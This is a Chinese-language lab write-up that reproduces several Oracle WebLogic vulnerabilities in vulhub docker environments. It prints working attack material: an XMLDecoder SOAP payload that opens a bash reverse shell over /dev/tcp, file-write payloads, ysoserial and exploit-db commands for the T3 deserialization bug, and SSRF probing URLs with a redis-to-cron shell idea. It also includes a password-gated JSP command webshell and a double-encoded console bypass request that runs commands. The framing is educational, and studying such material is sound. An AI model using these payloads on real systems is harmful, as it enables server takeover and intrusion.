## 零.介绍：

​ WebLogic是由美国Oracle公司出品的一application server， **准确的说就是一个基于JAVAEE而开发的一个中间件**
，类似Tomcat，WebLogic是一个用于开发，集成，部署与管理大型分布式Web应用，网络应用和数据库的java应用服务器。将java动态功能与java
Enterprise标准的安全性引入大型网络应用的开发，集成，部署与管理之中。

​ 其实WebLogic与我们所用的Tomcat定位一样，是用于部署java
web程序的服务器，用于连接客户端与服务器甚至可以部署管理数据库，对其进行管理，这也正是WebLogic与Tomcat的不同之处，
**WebLogic可以用于部署大型的项目**
，因为WebLogic中包括了ejb，jsp，servlet，jms的容器，是可以实现更高更多的功能，但是Tomcat是官方指定的jsp$servlet服务器，只实现了jsp/servlet的相关规范，并不支持EJB，
**但是对于我们学习或者搭建小型java web项目时，Tomcat是很方便的容器。**

​ WebLogic Server凭借其出色的群集技术，处理关键的Web应用系统问题所需的性能，可 **拓展性与高可用性。**

​
即实现了网络群集，也实现了EJB组件群集，不需要任何专门的硬件或操作系统支持，可以实现透明的复制，负载平衡以及表示内容容错。但是无论是网页群集还是组件群集，对于电子商务解决方案所需可拓展性与可用性都是至关重要的。共享客户机/服务器和数据库连接以及数据缓存和EJB都增强了性能表现，这也是其他Web应用程序所不具备的，所以在拓展性方面WebLogic是远超了Tomcat。

## 一.CVE-2017-10271漏洞复现

### 1）.官方文档

在CVE官网找到官方的描述：

​ Oracle Fusion Middleware 的 Oracle WebLogic Server 组件中的漏洞（子组件：WLS
Security）。受影响的受支持版本包括 10.3.6.0.0、12.1.3.0.0、12.2.1.1.0 和
12.2.1.2.0。易于利用的漏洞允许未经身份验证的攻击者通过 T3 进行网络访问，从而破坏 Oracle WebLogic
Server。成功攻击此漏洞可导致 Oracle WebLogic Server 被接管。CVSS 3.0 基本分数 7.5（可用性影响）。CVSS
Vector： （CVSS：3.0/AV：N/AC：L/PR：N/UI：N/S：U/C：N/I：N/A：H）.

### 2）.问题类型

​ 易于利用的漏洞允许未经身份验证的攻击者通过 HTTP 进行网络访问，从而破坏 Oracle WebLogic Server。成功攻击此漏洞可导致
Oracle WebLogic Server 被接管。

### 3）.影响版本

Weblogic Server

  * =10.3.6.0.0：影响 10.3.6.0.0

  * =12.1.3.0.0：影响 12.1.3.0.0

  * =12.2.1.1.0：影响 12.2.1.1.0

  * =12.2.1.2.0：影响 12.2.1.2.0

### 4）.漏洞描述：

​ 在Oracle Fusion Middleware中的Oracle Weblogic Server组件的WLS
Security子组件存在的安全漏洞，使用精心构造的xml数据可能造成任意代码执行，攻击者需要发送构造的HTTP请求，就可以得到目标服务器权限。攻击者可以利用漏洞控制组件，影像数据的可用性，保密性以及完善性。

​
兄弟们不难看出，与CVE-2018-2628不同的是，这次我们是伪造HTTP数据包进行构造payload,而CVE-2018-2628中是利用T3协议，直接在其中间插入反序列化的恶意代码，使其执行恶意类造成对象的直接调用。所以两个漏洞的原理其实都是反序列化，对于对象的直接调用导致，只不过利用原理不同。

​
其实CVE-2017-10271前身是CVE-2017-3506，在早期Oracle官方就发布了对于CVE-2017-3506的补丁，但是其实只是采用了黑名单的修复方案，所以经过精心的构造，还是可以抓包构造相应的http请求进行利用。

​ 经过我个人复现之后发现核心思想就是Weblogic
Sercurity组件对外提供了webservice服务，其中利用了xmldecoder的方式来解析用户所传输的xml数据，于是在解析过程中就出现了反序列化漏洞，导致了可执行的命令。

​ 当我们在复现时，访问wls-wsat/WorkContextServer这个目录，发现可以访问就说明有此漏洞，但是我看了很多文章，都没有说到到底为什么，或者这个目录文件是干什么的，这个其实是weblogic中wls-wast.war包提供的一个类，通过wls-wsat提供web
service服务，之后通过WLSServletAdapter进行处理，之后交给WorkContextServerTube类处理POST提交的数据包中xml的数据。

​ 看到一文章详细解释了调用过程，想要探究的兄弟移步：

​ https://www.secpulse.com/archives/66572.html

​ 在此不多解释了，我们开始复现：

### 5）.复现过程

搭建环境，首先利用docker搭建vulhub靶场，进入对应目录，并搭建环境

![image-20220110175517961](https://image.3001.net/images/20220113/1642034036_61df737496fce77cbc4b5.png!small)

成功

之后我们先查看vulhub提供的README.MD文件查看复现流程，发现其实和我们分析的一样，进行抓包修改http数据包进行恶意类实现

于是我们开始复现

 **首先验证漏洞是否存在**

  *  **1.利用工具进行验证**

利用安恒信息为大家提供的漏洞专项检测工具进行检测：

![image-20220110175210206](https://image.3001.net/images/20220113/1642034037_61df7375deb8427b6325c.png!small)

发现检测成功

![image-20220110180202750](https://image.3001.net/images/20220113/1642034039_61df73771abcdd0ec12cb.png!small)

漏洞确实存在

  *  **2.直接进行验证**

当我们搭好环境后发现可以访问http://127.0.0.1:7001/wls-wsat/CoordinatorPortType时说明存在此漏洞，原因上面说过，不在赘述了

![](https://image.3001.net/images/20220113/1642034040_61df73780760c4fefc097.png!small)

利用win10主机进行访问，抓包修改http数据包

![image-20220110180450438](https://image.3001.net/images/20220113/1642034041_61df73794291743c22a4a.png!small)

ok

* * *

####  **反弹shell**

在我们修改数据包插入poc之前首先监听靶机端口

![image-20220110183000321](https://image.3001.net/images/20220113/1642034049_61df738153ca2a60c8c73.png!small)

之后修改poc进行发送

反弹shellpoc

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash -i >& /dev/tcp/192.168.0.134/4444 0>&1</string>
    </void>
    </array>
    <void method="start"/></void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

修改数据包

![image-20220110183359227](https://image.3001.net/images/20220113/1642034050_61df73823aaadfa6c0cbc.png!small)

如图，首先请求类型为post，才能在下面添加poc

之后修改content-type类型为text/xml,直接修改文件类型可能会造成xml解析错误

之后将poc中ip改为监听地址

![image-20220110183547863](https://image.3001.net/images/20220113/1642034051_61df73833edcdfa43ae05.png!small)

成功反弹shell

注意，复现此漏洞时我只用了一个虚拟机

* * *

#### 文件上传

抓包并修改数据包实现文件上传漏洞

文件上传poc

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
             <java version="1.6.0" class="java.beans.XMLDecoder">
                        <object class="java.io.PrintWriter"> 
                            <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
                            <string>monster_test</string></void><void method="close"/>
                        </object>
                </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
    </soapenv:Envelope>
    

![](https://image.3001.net/images/20220113/1642034052_61df73844bd84e5d760cc.png!small

![image-20220110184007482](https://image.3001.net/images/20220113/1642034052_61df73844bd84e5d760cc.png!small)

放包，之后访问上传界面

![image-20220110184343621](https://image.3001.net/images/20220113/1642034053_61df73855abb2ad098513.png!small)

上传成功

## 二.CVE-2018-2628漏洞复现

### 1）.官方文档

在CVE官网中找到官方描述：

​ Oracle Fusion Middleware 的 Oracle WebLogic Server 组件（子组件：WLS Core
Components）中的漏洞。受影响的受支持版本包括 10.3.6.0、12.1.3.0、12.2.1.2 和
12.2.1.3。易于利用的漏洞允许未经身份验证的攻击者通过 T3 进行网络访问，从而破坏 Oracle WebLogic
Server。成功攻击此漏洞可导致 Oracle WebLogic Server 被接管。CVSS 3.0 基本分数
9.8（机密性、完整性和可用性影响）。CVSS Vector：
（CVSS：3.0/AV：N/AC：L/PR：N/UI：N/S：U/C：H/I：H/A：H）.

### 2）.问题类型

​ 易于利用的漏洞允许未经身份验证的攻击者通过 T3 进行网络访问，从而破坏 Oracle WebLogic Server。成功攻击此漏洞可导致
Oracle WebLogic Server 被接管。

### 3）.影响版本

Weblogic Server

  * =10.3.6.0：影响 10.3.6.0

  * =12.1.3.0：影响 12.1.3.0

  * =12.2.1.2：影响 12.2.1.2

  * =12.2.1.3：影响 12.2.1.3

复现时利用jdk 1.7以上版本就可以

### 4）.知识点补充

在复现漏洞之前首先需要了解一些名词与协议知识

* * *

####  **1.JAVA RMI(java remote method invocation) java远程方法调用：**

​
在编程语言中，是一种用于实现远程过程调用的应用程序接口。它使客户机上运行的程序可以调用远程服务器上的对象。这一方法可以使编程人员在网络环境中进行分布式操作。rmi全部的宗旨就是尽可能简化远程调用接口对象的使用。java
rmi极大依赖于接口。在需要创建一个远程对象的时候，程序员可以通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象正好与本地的根代码连接，由后者负责透过网络通信。

​ rmi可以直接跨越jvm(java虚拟机)进行调用远程方法，一般java方法调用指的是调用一个jvm内的一个方法，但是rmi与之恰恰相反。

​ 例如我们利用浏览器对于一个http协议实现的接口进行调用，这个接口可以称之为interface
invocation,而rmi的概念与之相似，同是调用，知识http协议调用的是一个接口，但是rmi调用的是一个java方法，java中对于rmi进行了一系列的定义。

​ **通俗易懂：rmi就是对于java远程方法的调用**

![image-20220108171827217](https://image.3001.net/images/20220113/1642034054_61df73865a3d60b82f6fe.png!small)

* * *

####  **2.JRMP协议(java remote method protocol) java远程调用协议：**

​
jrmp是基于tcp/ip之上的线路层协议，rmi的过程，就是利用jrmp协议进行组织数据格式之后通过tcp协议进行传输，从而达到rmi方法的实现，远程方法调用。

​
同rmi介绍中，我们使用浏览器进行访问一个网络接口时，浏览器与服务器之间的数据传输以及数据格式之间的组织，是用到基于tcp/ip之上的Http协议，只有基于Http协议，浏览器与服务端才能约定好，进行正常的交流通讯，jrmp也是基于此原理，但是jrmp仅用于java
RMI中。

​ jrmp是一个用于rmi (java远程方法调用的协议)只有基于此协议，调用双方才能正常数据交流。

​
**关键的是，jrmp协议对于rmi调用双方都必须是依赖于java语言的，即客户端与服务端都必须使用java，jrmp是基于流的协议，只能是一个对象的java到java的调用。**

​ **可以参考上面的rmi调用步骤图进行理解。**

* * *

####  **3.T3协议：**

​
之前提及jrmp只用于单个对象的java到java调用，而T3协议就是用于Weblogic服务器与其他类型的java程序之间进行传输信息的程序。Weblogic跟踪连接到应用程序的每个jvm，将流量传输到jvm，Weblogic会创建一个T3连接，该连接会通过消除网络之间的多个协议来进行最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。

​ **T3协议主体包括：**

​ 1.请求包头 2.请求主体

请求包头类似：

    
    
    t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://localhost:7001 LP:DOMAIN 1
    

以`\n`结束

同时，我们发送t3的请求包， **可用于刺探服务器weblogic版本，该服务器会将自身版本进行响应** ，形如

    
    
    HELO:12.1.3.0 false AS:2048 HL:19 MS:10000000
    

**而在此漏洞中原理也是，在T3协议中将一部分替换为恶意序列化数据进行恶意操作的实现**

* * *

#### 4.ysoserial：

​ java反序列化漏洞原理的分析，大多都是分析使用Apache Commons
Collections这个第三方库，我们分析学习的cc链也是基于此库，而ysoserial则是一个用于生成利用不安全的java对象反序列化的有效负载的概念验证工具。为java反序列化提供了更多的可能。

​ ysoserial利用了java反射机制与动态代理机制生成poc。

​ 感兴趣的兄弟可以下载分析一波，里面有很多payload值得学习。

​ 当时在导入maven包时可能会有报错，正常问题，百度就可以找到大致解决方法。

### 5）.复现过程

首先我们打开虚拟机

启动vulhub/weblogic/CVE-2018-2628环境

利用docker ps查看uid与启动端口

![image-20220108181454376](https://image.3001.net/images/20220113/1642034055_61df73876c81a3df0294d.png!small)

此时访问http://127.0.0.1:7001/console/就可以访问到weblogic

![image-20220108181627147](https://image.3001.net/images/20220113/1642034056_61df7388bac6beedac20f.png!small)

环境布置成功，此时我们了解一下复现的原理

由于docker只能与布置主机(虚拟机)进行直接命令互通，所以我们直接利用虚拟机作为攻击机，利用docker作为靶机进行复现

查看docker容器的ip

![image-20220108182039446](https://image.3001.net/images/20220113/1642034058_61df738a4deccf905d5e1.png!small)

即攻击机ip:192.168.0.134

靶机ip:172.24.0.2

环境建立好了，ip也知道了，此时我们在两台服务器之间建立JRMP服务，在攻击机中启动一个JRMP Server，利用ysoserial来建立

    
    
    wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
    

![image-20220108182419611](https://image.3001.net/images/20220113/1642034065_61df7391cf739b4dfe2b4.png!small)

加载成功，一开始可能会报错，连接错误或拒绝访问，多试几次就可以了。

查看文件位置

![image-20220108182549886](https://image.3001.net/images/20220113/1642034067_61df73932dc7f969eab8f.png!small)

有了! 注意此时我是在weblogic文件夹中建立的，推荐在桌面创建一个文件夹进行下载存储。

此时我们利用ysoserial来监听weblogic中的7001端口

    
    
    java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099(监听端口) CommonsCollections1 'touch /tmp/执行命令'
    

![image-20220108183024765](https://image.3001.net/images/20220113/1642034068_61df73940c387dc227fc6.png!small)

开始监听

之后我们到利用类下载网站https://www.exploit-db.com/exploits/44553下载exploit脚本

![image-20220108183216010](https://image.3001.net/images/20220113/1642034069_61df7395282834fb69b7f.png!small)

下载后拖动虚拟机或直接下载都可以

![image-20220108183251504](https://image.3001.net/images/20220113/1642034070_61df7396ae0abce8acb5a.png!small)

直接下载命令：

    
    
    wget https://www.exploit-db.com/download/44553
    下载下来的python文件，没有格式，我们就要手动改一下，才能运行
    mv 44553 44553.py
    

![image-20220108183406936](https://image.3001.net/images/20220113/1642034072_61df739828c7896f95f5d.png!small)

之后调用脚本进行执行之前的exp

    
    
    python 44553.py 172.24.0.2 7001(weblogic地址及端口) ysoserial-0.0.6-SNAPSHOT-BETA-all.jar(ysoserial目录，一般默认) 192.168.100.34 1099(本机地址及端口) JRMPClient(调用jrmp的类)
    
    
    
    python 44553.py 172.24.0.2 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.100.34 1099 JRMPClient
    

![](https://image.3001.net/images/20220113/1642034073_61df7399c2e7b083df038.png!small)

![](https://image.3001.net/images/20220113/1642034076_61df739c2f3ff34de17cf.png!small)

执行成功!查看端口回显:

![image-20220108184119766](https://image.3001.net/images/20220113/1642034078_61df739e73d97e0fd6fc2.png!small)

查看docker目录下是否多了 **lidalu.txt**

![image-20220108184249425](https://image.3001.net/images/20220113/1642034080_61df73a0c733e6eacce31.png!small)

我们发现，命令执行成功了，此时可以验证，复现成功了!

## 三.CVE-2014-4210 SSRF漏洞复现

### 1）.官方文档

Oracle Fusion Middleware 10.0.2.0 和 10.3.6.0 中的 Oracle WebLogic Server
组件中存在未指定的漏洞，使得远程攻击者能够通过与 WLS 相关的载体 （ Web Services） 影响机密性。

### 2）.影响版本

weblogic

10.0.2--10.3.6.0

### 3）.漏洞描述

在weblogic 10.0.2--10.3.6.0版本，http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp处存在漏洞，我们可以同通过构造请求来利用返回的错误信息来观察探测开放端口的状态等，甚至可以通过该ssrf构造任意http请求来攻击内网redis或fastcgi等组件。

### 4）.SSRF

#### ***ssrf(server-side request forgery:服务器请求伪造)***是一种由攻击者构造的由服务端请求的一个安全漏洞。

通常情况下，一般防火墙只对于外部网络进行防护，但是对于内部网络没有过多的措施，于是我们直接伪装成为内部机器向内网发送请求，机器就会判定这样的请求是安全可靠的，于是就会执行我们所想要执行的命令，也就绕过了防火墙的限制，并对内网实现横向渗透，这就是一般ssrf的实现方式：

 **例如：**

**假设一个公司的网络对于外网提供了名为public.example.com的网站服务器，该网站通过后置/proxy，来对于url中的指定参数进行网页链接的跳转，例如**

**public.example.com/proxy?url=google.com此时页面就会跳转到谷歌界面，此公司的后台管理界面域名为admin.example.com，此链接只能由内部网络进行访问，外网无法直接访问，于是此时我们如果构造public.example.com/proxy?url=admin.example.com来访问，会发生什么情况呢，此时内网会判定此请求是由供公司内部机器进行的请求，于是就会直接跳转到相应的界面，这就是对于外部的服务与内部机器之间没有实施相应的安全措施，就造成了ssrf的实现**

####  **ssrf实现:**

通常情况下，ssrf一般发生在服务端在请求外部资源的情况中，例如有时服务端应用会请求读取外部图片来创建缩略图

或者在浏览评论时有视频文件的动态资源图片 ，于是，如果此时服务端没有对于图片或gif动图采取内部资源处理的话，我们就可以利用其来实现ssrf

进一步访问内部网络中的信息系统

还有如果一个网站支持以url的形式获取用户头像的话，并且并没有对于内部资源或url有进一步的安全措施，我们就可以通过ssrf实现恶意功能

#### ssrf攻击形式：

1.我们可以在目标url后添加不同ip来根据回显信息了解服务器的一些信息或内网的信息

2.我们在ip后加不同的port也可以根据回显信息来判断服务或一些端口信息，实现内网端口扫描

3.最严重的，ssrf可以通过构造一些危险url获取到一些信息，比如管理员密码，之后上传webshell，之后你懂的

或者对于一些薄弱的网址或不安全的管理界面入手进行，利用其弱点进行构造脚本，来实现远程代码执行

 **至于具体实现方式，大家了解就好，切勿做违法乱纪的事**

说完了这些，此时我们开始复现：

### 5）.复现过程：

复现这个漏洞的时候我docker访问redies的时候发生了错误，就是拖托取环境失败了，于是我们在本机进行手动搭建weblogic环境复现：

首先下载weblogic环境，可以在下面网盘下载：

https://pan.baidu.com/s/1wz1_ctJJdaYYXaXpmNO0kw#list/path=%2F&parentPath=%2Fsharelink765468514-715314846720175

或者直接去官网进行下载：

https://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html

下载后安装，下面提供安装教程：

https://blog.csdn.net/hdqhdq123/article/details/41745889

因为上面网盘提供的就是10.3.6.0，所以我特意找了一个对应版本的教程

安装成功后，打开

![image-20220111185440820](https://image.3001.net/images/20220113/1642034084_61df73a49a2641e0877e4.png!small)

对应目录下的cmd文件，会自动启动weblogic服务

![image-20220111185612859](https://image.3001.net/images/20220113/1642034085_61df73a59f4064c001828.png!small)

如下信息表示启动成功

访问http://youip:7001访问weblogic,之后我们进入漏洞所在目录：

http://192.168.0.1:7001/uddiexplorer

![image-20220111185742671](https://image.3001.net/images/20220113/1642034086_61df73a6e6a64545b55a6.png!small)

漏洞存在于

![image-20220111185815677](https://image.3001.net/images/20220113/1642034088_61df73a82a82bc6023f4c.png!small)

此时我们构造恶意url：在url后面加入

?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://youip:7001

![image-20220111190012890](https://image.3001.net/images/20220113/1642034089_61df73a9268b3950b6108.png!small)

此时发包

![image-20220111190044775](https://image.3001.net/images/20220113/1642034090_61df73aa16b75094107e7.png!small)

回显如下结果，此回显表示此ip存在并且端口开放

![image-20220111190210054](https://image.3001.net/images/20220113/1642034091_61df73ab237225b4e6597.png!small)

此处泄露了内网信息，此时我在本地搭建，所以显示localhost，如果我们现实遇到不会显示localhost

我们访问redis服务

![image-20220111190852191](https://image.3001.net/images/20220113/1642034092_61df73ac25f451beda174.png!small)

显示未开放

* * *

 **对于ssrf探测回显信息的意义有四种：**

* * *

>   *  **对于请求未开放的服务：**
>
>   *     * weblogic . uddi. client. structures. exception.XML_ SoapException:
> Triedall:'1' addresses, but could not connect over HT TP to
> server:'fuzz.wuyun.com', port: '88'
>
>   *  **对于请求可能被识别的服务：**
>
>   *     * weblogic.uddi. client structures. exception.XML
> SoapException:Received a response from url: http :/www.baidu.com/ which did
> not have a valid SOAP content-type: text/html; charset=UTF-8.
>
>     * 即我们之前提及的可以跳转的url
>
>   *  **对于请求开放的服务：**
>
>   *     * weblogic . uddi. client. structures.exception.XML
> SoapException:Received a response from url: http://fuzz .wuyun .com:22 /helo
> which did not have a valid SOAP content-type: null.
>
>   *  **对于不可被识别的服务：**
>
>   *     * weblogic.uddi. client. structures .exception.XML_
> SoapException:Received a response from url: http://fuzz .wuyun.com:22 which
> didnot have a valid SOAP content-type: null.
>
>

此时我们访问6389端口发先未开放redis服务，因为我没有搭建数据库等内网服务

当我们遇到开放redis服务的机器时，即6389显示开放的机器，我们利用此机器为跳板，向开启redis的机器发送弹shell的脚本到/etc/cronrab文件，之后开启监听，反弹shell即可

## 四.CVE-2018-2894漏洞复现

### 1）.官方文档

​ Oracle Fusion Middleware 的 Oracle WebLogic Server 组件中的漏洞（子组件：WLS - Web
Services）。受影响的受支持版本包括 12.1.3.0、12.2.1.2 和 12.2.1.3。易于利用的漏洞允许未经身份验证的攻击者通过 HTTP
进行网络访问，从而破坏 Oracle WebLogic Server。成功攻击此漏洞可导致 Oracle WebLogic Server 被接管。CVSS
3.0 基本分数 9.8（机密性、完整性和可用性影响）。CVSS Vector：
（CVSS：3.0/AV：N/AC：L/PR：N/UI：N/S：U/C：H/I：H/A：H）.

### 2）.影响版本

​ Weblogic Server

  * 12.1.3.0

  * 12.2.1.2

  * 12.2.1.3

在网上看到很多文章都写了包括版本10.3.6.0的weblogic，但是我搭完环境之后查看，没有在域管理高级设置里找到Enable Web Service
Test Page这一选项，如果有懂的兄弟可以告我一声。

### 3）.漏洞描述

​ 在多个Weblogic Server版本中，我们通过开启web服务测试页也就是上面所说的Enable Web Service Test
Page，可以实现任意文件上传，但是其实经过测试，这个洞可用之处少之又少，因为其实在生产模式中，web服务测试页是默认关闭的，所以我们其实是无法从外网访问到weblogic的，所以其实利用范围很局限。

​ 在打开web服务测试页选项后，我们设置测试页地址为一个公开地址，之后在此页面展示上传文件处即可实现任意文件上传。

### 4）.漏洞复现

我利用了docker+vulhub进行复现

首先部署环境

![image-20220112175205528](https://image.3001.net/images/20220113/1642034093_61df73ad9cf4497dd6a06.png!small)

查看readme.me文件了解思路

![image-20220112175250818](https://image.3001.net/images/20220113/1642034095_61df73af9bbf067351350.png!small)

通过docker-compose logs | grep
password命令获取weblogic后台登录用户名密码（win中搭建环境的兄弟在安装的时候就会显示设置账号密码，之前提起，我们不多做解释）

![image-20220112175417504](https://image.3001.net/images/20220113/1642034097_61df73b1d629b07f5d26a.png!small)

输入进行登录

![image-20220112175550092](https://image.3001.net/images/20220113/1642034099_61df73b300998270fce4b.png!small)

登陆成功后，在域管理中找到其他选项设置

![image-20220112175640394](https://image.3001.net/images/20220113/1642034100_61df73b4b8d9b4030368b.png!small)

勾选中服务器测试页选项（我之前说的10.3.6.0没有此选项就是这个）

![image-20220112175756985](https://image.3001.net/images/20220113/1642034102_61df73b648a91778e4725.png!small)

设置完成后我们设置测试页面

访问http://172.17.0.1:7001/ws_utc/config.do

![image-20220112180049524](https://image.3001.net/images/20220113/1642034103_61df73b76951860368547.png!small)

或访问http://172.17.0.1:7001/ws_utc/begin.do

![](https://image.3001.net/images/20220113/1642034104_61df73b88e6da3a71cf51.png!small)

访问config.do修改work home dir为静态地址

/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css

因为这个地址是外网可以访问的，我们自动部署的web服务就在这个地址，这个目录外网可以访问且不需要权限，外网通过http://your-ip:7001/ws_utc/css/文件名来访问这个地址下的文件，于是此时我们就可以实现任意文件上传了

![image-20220112180218672](https://image.3001.net/images/20220113/1642034105_61df73b9a1ab904eea308.png!small)

在security中添加文件

![image-20220112180731257](https://image.3001.net/images/20220113/1642034106_61df73baadd1d97f4d905.png!small)

上传webshell

    
    
    <%
        if("123".equals(request.getParameter("pwd"))){
            java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
            int a = -1;
            byte[] b = new byte[2048];
            out.print("<pre>");
            while((a=in.read(b))!=-1){
                out.println(new String(b));
            }
            out.print("</pre>");
        }
    %>
    

![image-20220112181409190](https://image.3001.net/images/20220113/1642034107_61df73bb899546dcecb30.png!small)

![image-20220112181438220](https://image.3001.net/images/20220113/1642034108_61df73bc485bdde0b3d01.png!small)

上传成功

![image-20220112181506558](https://image.3001.net/images/20220113/1642034108_61df73bce7aec9cb30f46.png!small)

打开网页控制台，找到对应前台代码，找到时间戳

![image-20220112181842826](https://image.3001.net/images/20220113/1642034110_61df73be48b345ea26549.png!small)

之后访问上传的文件，http://192.168.0.134:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]执行webshell（注意此时访问的是你虚拟机的地址，不能是127，否则会显示404）

![image-20220112182619472](https://image.3001.net/images/20220113/1642034111_61df73bfd7d0ee41de0f7.png!small)

![image-20220112182711243](https://image.3001.net/images/20220113/1642034112_61df73c0f32663ab03664.png!small)

查看文件目录执行成功

在网上看文章，一个师傅写了一个大马，我们利用一下

![image-20220112183004702](https://image.3001.net/images/20220113/1642034113_61df73c1cde2123450f76.png!small)

执行jsp大马

![image-20220112183200785](https://image.3001.net/images/20220113/1642034114_61df73c28ac63ca83f9a6.png!small)

上菜刀!

![image-20220112183812176](https://image.3001.net/images/20220113/1642034115_61df73c396730b7b0eb83.png!small)

连接好了!

![image-20220112183718270](https://image.3001.net/images/20220113/1642034116_61df73c491cc5204f90cd.png!small)

我看到的jsp大马老哥的网址在这，兄弟们可以移步

https://blog.csdn.net/weixin_43625577/article/details/97001677

复现完成后兄弟们其实也发现这个洞的局限之处，就是版本控制严重而且一般不会对外开放测试页面的，所以想要上传文件其实是很难的

## 五.CVE-2020-14882

### 1）.官方文档

​ Oracle Fusion Middleware 的 Oracle WebLogic Server 产品中的漏洞（组件：控制台）。受影响的受支持版本包括
10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0 和 14.1.1.0.0。易于利用的漏洞允许未经身份验证的攻击者通过
HTTP 进行网络访问，从而破坏 Oracle WebLogic Server。成功攻击此漏洞可导致 Oracle WebLogic Server
被接管。CVSS 3.1 基本分数 9.8（机密性、完整性和可用性影响）。CVSS Vector：
（CVSS：3.1/AV：N/AC：L/PR：N/UI：N/S：U/C：H/I：H/A：H）.

### 2）.问题描述

​ 易于利用的漏洞允许未经身份验证的攻击者通过 HTTP 进行网络访问，从而破坏 Oracle WebLogic Server。成功攻击此漏洞可导致
Oracle WebLogic Server 被接管。

### 3）.影响版本

​ WebLogic Server

  * =10.3.6.0.0：影响 10.3.6.0.0

  * =12.1.3.0.0：影响 12.1.3.0.0

  * =12.2.1.3.0：影响 12.2.1.3.0

  * =12.2.1.4.0：影响 12.2.1.4.0

  * =14.1.1.0.0：影响 14.1.1.0.0

### 4）.漏洞描述

​
2020十月的weblogic服务器更新中，官方修复了两个由长亭科技安全研究员@voidfyoo提交的安全漏洞，为cve-2020-14882与cve-2020-14883

​
14882漏洞允许未授权用户绕过管理控制台的权限验证访问后台，14883允许后台任意用户通过http协议执行任意命令，使用两个漏洞形成的利用链可以通过一个GET请求在远程weblogic服务器上以未授权的任意用户执行命令。

​ --------------------vulhub文件描述

​
这个漏洞是一个console组件的未授权访问，而cve-2020-14882就在未授权的前提之下，在console进行代码执行，攻击者于是可以构造特殊的http请求，在未经验证的情况下接管weblogic
server console，并执行任意代码，触发在console组件，而console对应的webapp，所以形成了此漏洞。

​
网上看到一篇对于14882与14883的分析文章，想探究或者了解代码原理的兄弟们移步https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4

​ 我们这里不做赘述，进行复现

### 5）.漏洞复现

利用docker+vulhub搭建环境

![image-20220112191839508](https://image.3001.net/images/20220113/1642034117_61df73c58d9fbb2f65a03.png!small)

查看readme.me文件了解复现步骤以及复现原理

![image-20220112192027919](https://image.3001.net/images/20220113/1642034119_61df73c720046292f1a7a.png!small)

访问http://192.168.0.134:7001/console进入登录界面

之后我们访问构建的url直接绕过访问后台界面http://192.168.0.134:7001/console/css/%252e%252e%252fconsole.portal

%252e%252e%252f就是二次编码过的../，利用此转义实现穿越路径未授权访问后台

![image-20220112194142898](https://image.3001.net/images/20220113/1642034121_61df73c9345d99aa98890.png!small)

但是此时我们看到，与之前利用账号密码登录的时候少了很多东西，因为未授权登录使我们权限不足，缺少部署执行等功能，我们利用14883来进行组合攻击

![image-20220112192204458](https://image.3001.net/images/20220113/1642034122_61df73ca4cfc48c23d4da.png!small)

首先我们利用exploit类执行某些命令

下载exploit

![image-20220112193543936](https://image.3001.net/images/20220113/1642034124_61df73cc3678963874070.png!small)

![image-20220112193613501](https://image.3001.net/images/20220113/1642034125_61df73cd7d5c16b6d11d0.png!small)

![image-20220112193634146](https://image.3001.net/images/20220113/1642034126_61df73ce72dce95eb19fb.png!small)

执行成功

我们试一下执行命令

抓包

![image-20220112195216386](https://image.3001.net/images/20220113/1642034127_61df73cfd18b4f784f1bb.png!small)

修改数据包，构造执行命令打开计算机

![image-20220112195351552](https://image.3001.net/images/20220113/1642034129_61df73d150c8243e03e2d.png!small)

放包

![image-20220112195414410](https://image.3001.net/images/20220113/1642034130_61df73d2b030789633390.png!small)

成功

实现写入文件

还是一样的思路

抓包

![image-20220112201133391](https://image.3001.net/images/20220113/1642034132_61df73d468f0f9ebc4745.png!small)

修改数据包，实现写入文件

    
    
    POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
    Host: 192.168.0.134:7001
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 138
    
    _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/123.txt');")
    

成功写入！

![image-20220112201341453](https://image.3001.net/images/20220113/1642034133_61df73d59659e940950eb.png!small)

对于weblogic的复现就到这，兄弟们精益求精啊

# 好好学习，天天向上！

